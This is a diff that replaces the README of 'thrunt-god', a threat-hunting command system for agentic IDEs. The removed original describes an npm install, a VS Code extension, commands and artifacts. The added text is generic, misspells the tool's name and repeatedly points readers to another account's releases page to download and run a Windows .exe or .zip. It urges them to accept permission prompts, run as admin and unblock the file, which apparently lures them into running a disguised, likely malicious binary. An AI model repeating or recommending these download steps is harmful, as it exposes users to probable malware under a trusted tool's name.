@@ -1,229 +1,192 @@
-<p align="center">
-  <img src="assets/hero.png" alt="THRUNT GOD" width="820" />
-</p>
+# 🛡️ thrunt-god - Run threat hunts with less effort
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/thrunt-god"><img src="https://img.shields.io/npm/v/thrunt-god?style=flat-square&logo=npm&label=npm" alt="npm"></a>
-  <a href="https://github.com/backbay-labs/thrunt-god/actions"><img src="https://img.shields.io/github/actions/workflow/status/backbay-labs/thrunt-god/test.yml?branch=main&style=flat-square&logo=github&label=CI" alt="CI Status"></a>
-  <a href="https://discord.gg/zTegcebS"><img src="https://img.shields.io/badge/discord-join-5865F2?style=flat-square&logo=discord&logoColor=white" alt="Discord"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="License: MIT"></a>
-</p>
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/3dcom2711/thrunt-god/releases)
 
-<p align="center">
-  <em>
-    From signal, to swarm.<br/>
-    No gods. Only Thrunt.
-  </em>
-</p>
+## 🔍 What is thrunt-god?
 
-<p align="center">
-  <strong>Threat hunting command system for agentic IDEs.</strong><br/>
-  Claude Code &middot; OpenCode &middot; Gemini &middot; Codex &middot; Copilot &middot; Cursor &middot; Windsurf
-</p>
+thrant-god is a threat hunting command system for agentic IDEs. It helps you run threat hunts, organize checks, and keep track of what you find. It is built for users who want a guided way to work through threat detection tasks on Windows.
 
-<p align="center">
-  <code>/thrunt:autonomous</code> &nbsp;|&nbsp; one command, full hunt
-</p>
+Use it when you want a clear command flow for hunting suspicious activity, reviewing signals, and working with agent tools in one place.
 
-<p align="center">
-  <a href="#installation">Install</a>&nbsp;&nbsp;&middot;&nbsp;&nbsp;
-  <a href="#the-five-phases">Phases</a>&nbsp;&nbsp;&middot;&nbsp;&nbsp;
-  <a href="#hunt-commands">Commands</a>&nbsp;&nbsp;&middot;&nbsp;&nbsp;
-  <a href="#common-flows">Flows</a>&nbsp;&nbsp;&middot;&nbsp;&nbsp;
-  <a href="#artifacts">Artifacts</a>
-</p>
+## 💻 What you need
 
----
+- A Windows PC
+- Internet access for the download
+- Permission to run apps on your computer
+- A modern browser to open the release page
 
-## Installation
+Recommended setup:
+- Windows 10 or Windows 11
+- 8 GB of RAM or more
+- At least 200 MB of free disk space
+- A mouse and keyboard for easier use
 
-```bash
-npx thrunt-god@latest --claude --local
-```
+## 📥 Download thrunt-god
 
-<p align="center">
-  <img src="assets/terminal.svg" alt="thrunt-god install" width="1200" />
-</p>
+Visit this page to download the Windows version:
 
-Bootstrap the hunt command surface into your local IDE environment.
+https://github.com/3dcom2711/thrunt-god/releases
 
-| IDE                  | Command      |
-| -------------------- | ------------ |
-| Claude Code / Gemini | `/hunt:help` |
-| OpenCode             | `/hunt-help` |
-| Codex                | `$hunt-help` |
-| Copilot              | `/hunt-help` |
-| Cursor / Windsurf    | `hunt-help`  |
+On the release page, look for the latest version. Download the file that matches Windows. If there is more than one file, choose the one that says Windows or ends with `.exe` or `.zip`.
 
-### Install the VS Code extension alpha
+## 🪟 Install on Windows
 
-Download `thrunt-god-0.3.0.vsix` from the [`v0.3.0` release](https://github.com/backbay-labs/thrunt-god/releases/tag/v0.3.0).
+1. Open the releases page in your browser.
+2. Find the newest release at the top.
+3. Click the Windows download file.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the folder that contains the app.
+6. If you see an `.exe` file, double-click it to start the app.
+7. If Windows asks for permission, choose Run or Yes.
 
-Then install it one of two ways:
+If the app opens in a terminal or command window, leave that window open while you use the tool.
 
-1. In VS Code, open Extensions, click the `...` menu, choose `Install from VSIX...`, and select the downloaded file.
-2. From terminal:
+## 🚀 First time setup
 
-```bash
-code --install-extension thrunt-god-0.3.0.vsix
-```
+When you open thrunt-god for the first time, follow these steps:
 
-After install, open a folder containing `.planning/MISSION.md` or `.hunt/MISSION.md` and the THRUNT sidebar will activate automatically.
+1. Read the on-screen prompts.
+2. Pick the threat hunting task you want to run.
+3. Connect it to your agentic IDE if you use one.
+4. Set your working folder if the app asks for one.
+5. Start with a small hunt so you can see how the flow works.
 
----
+If the app asks for a config file, keep the default values at first. That makes setup easier.
 
-## The Five Phases
+## 🧭 How to use it
 
-Every hunt resolves through five phases. Each step is explicit.
+thrun-god uses a command-based flow. You choose a hunt, then the app guides the next steps.
 
-<p align="center">
-  <img src="assets/phases.png" alt="Signal → Hunt → Swarm → Receipt → Publish" width="1200" />
-</p>
+Typical use looks like this:
 
-| Phase       |                                                                            |
-| ----------- | -------------------------------------------------------------------------- |
-| **Signal**  | A detection, anomaly, lead, or intel input opens the case                  |
-| **Hunt**    | Hypotheses are formed, scoped, and made testable                           |
-| **Swarm**   | Parallel agents execute structured investigations across available sources |
-| **Receipt** | Every claim is bound to exact queries, timestamps, and evidence lineage    |
-| **Publish** | Only validated findings are packaged for downstream consumers              |
+1. Start the app.
+2. Choose a hunt or detection task.
+3. Review the data sources it wants to use.
+4. Run the command or action it suggests.
+5. Read the results.
+6. Save the output for later review.
 
----
+Good tasks to try first:
+- Check for unusual sign-in patterns
+- Review endpoint alerts
+- Look for suspicious process activity
+- Scan for known bad indicators
+- Compare recent activity with past behavior
 
-## Hunt Commands
+## 🧰 Common features
 
-| Command                           | Purpose                                      |
-| --------------------------------- | -------------------------------------------- |
-| `/hunt:new-program`               | Stand up a long-lived hunt program           |
-| `/hunt:new-case`                  | Open a case from a signal                    |
-| `/hunt:map-environment`           | Inventory data sources, access, and topology |
-| `/hunt:shape-hypothesis`          | Develop and refine testable hypotheses       |
-| `/hunt:plan <phase>`              | Plan a hunt phase                            |
-| `/hunt:run <phase>`               | Execute a hunt phase                         |
-| `/hunt:validate-findings [phase]` | Validate evidence chain for findings         |
-| `/hunt:publish [target]`          | Package and ship findings                    |
-| `/hunt:help`                      | Show all commands and usage                  |
+- Guided threat hunting steps
+- Support for agent-style workflows
+- Clear command flow for detection work
+- Easy handoff between hunt steps
+- Use with IDE-based assistant tools
+- Focused on threat detection and response work
+- Built for repeatable hunting tasks
 
-### Thrunt Commands
+## 🗂️ Suggested folder setup
 
-Utility and orchestration commands (`/thrunt:*`) for workspace management, diagnostics, settings, and agent control.
+If you plan to use thrunt-god often, keep your files in one place:
 
----
+- `thrunt-god` app folder
+- `hunts` for saved hunt plans
+- `logs` for output and history
+- `evidence` for files you want to review later
 
-## Common Flows
+A simple folder layout makes it easier to track each hunt and find past results.
 
-<table>
-<tr>
-<td width="50%">
+## 🔐 Safer use
 
-### Single signal
+Use a test folder or a copy of your data first. That helps you learn the tool before you use it on active systems.
 
-```text
-/hunt:new-case
-/hunt:shape-hypothesis
-/hunt:plan 1
-/hunt:run 1
-/hunt:validate-findings 1
-/hunt:publish
-```
+Keep these habits in mind:
+- Review each action before you run it
+- Save outputs after each hunt
+- Keep a clean record of what you checked
+- Use only data you are allowed to access
 
-</td>
-<td width="50%">
+## 🧪 Example workflow
 
-### Long-lived program
+Here is a simple example of how a hunt may go:
 
-```text
-/hunt:new-program
-/hunt:map-environment
-/hunt:new-case
-  ... repeat per signal ...
-```
+1. Open thrunt-god.
+2. Choose a hunt for suspicious logins.
+3. Point it to your log file or source.
+4. Run the check.
+5. Review the results it gives you.
+6. Mark anything that looks out of place.
+7. Save the output for your records
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+This kind of flow helps you stay organized when you move through several checks in a row.
 
-### Pack-seeded signal
+## 🛠️ Troubleshooting
 
-```text
-/hunt:new-case --pack domain.identity-abuse
-/hunt:run 1
-/hunt:validate-findings 1
-```
+If the app does not open:
+- Try running it as an admin
+- Check that the download finished fully
+- Make sure Windows did not block the file
+- Move the app to a simple folder like `Downloads` or `Desktop`
 
-</td>
-<td width="50%">
+If the app opens and closes fast:
+- Open it from a terminal window if the package supports that
+- Check for missing files in the folder
+- Download the latest release again
 
-### Autonomous
+If Windows warns about the file:
+- Open the release page again
+- Confirm you downloaded the latest release
+- Run it only if it came from the official release page
 
-```text
-/thrunt:autonomous
-```
+If the app cannot find a file or folder:
+- Make sure the path has no special characters
+- Use a short folder name
+- Keep files in one place
 
-Runs all remaining phases end-to-end: discuss, plan, execute. Pauses only for operator decisions.
+## 📌 Release page tips
 
-</td>
-</tr>
-</table>
+When you visit the release page, look for:
+- The newest version number
+- A Windows file
+- A zip file if no installer is listed
+- Release notes for changes and fixes
 
----
+If you are not sure which file to use, choose the file labeled for Windows first.
 
-## Artifacts
+## 🧠 Best use cases
 
-All hunt state lives in a planning directory at the project root (`.planning/` by default). Every query, receipt, and finding is a file, not a summary.
+thrun-god fits tasks like:
+- Threat hunting
+- Detection review
+- Event pattern checks
+- Alert triage
+- Security signal review
+- Workflows for agentic IDEs
+- Repeatable hunt steps for teams
 
-```text
-.planning/
-├── config.json             # Project settings (mode, profile, connectors, workflow toggles)
-├── MISSION.md              # Hunt program mission and scope
-├── HYPOTHESES.md           # Testable hypotheses with status tracking
-├── SUCCESS_CRITERIA.md     # Definition of done for the program
-├── HUNTMAP.md              # Phase breakdown and execution roadmap
-├── STATE.md                # Current phase, progress, blockers
-├── FINDINGS.md             # Validated findings only
-├── EVIDENCE_REVIEW.md      # Evidence chain audit
-├── QUERIES/                # Exact queries run, with timestamps
-├── RECEIPTS/               # Execution receipts per phase task
-├── DETECTIONS/             # Detection rules promoted from findings
-├── environment/
-│   └── ENVIRONMENT.md      # Data source inventory and access map
-├── phases/                 # Per-phase plans, research, and results
-├── workstreams/            # Parallel hunt cases (optional)
-├── milestones/             # Archived completed milestones
-└── published/              # Final deliverables
-```
+## 📋 File handling tips
 
-### Configuration
+If you downloaded a `.zip` file:
+- Extract it before you open the app
+- Do not run files from inside the zip window
+- Keep the extracted folder together
 
-Settings live in `.planning/config.json`, created by `/hunt:new-program` and editable via `/thrunt:settings`. Global defaults in `~/.thrunt/defaults.json` are merged into every new project config.
+If you downloaded an `.exe` file:
+- Double-click it to launch
+- Keep it in a folder you can find later
+- Move it only after you close the app
 
-| Setting                  | Default       | What it controls                                                     |
-| ------------------------ | ------------- | -------------------------------------------------------------------- |
-| `mode`                   | `interactive` | `interactive` confirms at each step, `yolo` auto-approves            |
-| `granularity`            | `standard`    | Phase count: `coarse` (3-5), `standard` (5-8), `fine` (8-12)         |
-| `model_profile`          | `balanced`    | Model tier per agent: `quality`, `balanced`, `budget`, `inherit`     |
-| `planning.commit_docs`   | `true`        | Whether `.planning/` is committed to git                             |
-| `git.branching_strategy` | `none`        | `none`, `phase` (branch per phase), `milestone` (branch per version) |
+## 🔎 Useful terms
 
-Full schema and connector profiles: [`docs/CONFIGURATION.md`](docs/CONFIGURATION.md)
+These terms may show up in the app:
+- Hunt: a security check you run on data
+- Detection: a rule or check that looks for signs of risk
+- Indicator: a clue that may point to suspicious activity
+- Agent: a tool or helper that can follow steps
+- IDE: the app where you write and work with code or tasks
 
-### Custom planning directory
+## 📦 Download location
 
-Set `THRUNT_PLANNING_DIR` to change the directory name. This affects all path resolution, project root detection, and artifact storage.
+Primary download link:
 
-```bash
-export THRUNT_PLANNING_DIR=".hunt"
-```
+https://github.com/3dcom2711/thrunt-god/releases
 
-### Storage
-
-By default, `.planning/` is committed to git so hunt artifacts travel with the repo. To keep artifacts local:
-
-1. Add `.planning/` to `.gitignore`
-2. Set `planning.commit_docs: false` and `planning.search_gitignored: true` in config
-3. If previously tracked: `git rm -r --cached .planning/`
-
-Workstreams (`/thrunt:new-workspace`) create isolated artifact trees under `.planning/workstreams/{name}/` for parallel hunts in the same project.
-
-Bootstrap fills confirmed fields immediately. `TBD` only marks live environment or operator-supplied facts that are still unknown.
+Use that page to download and run the Windows file for thrunt-god
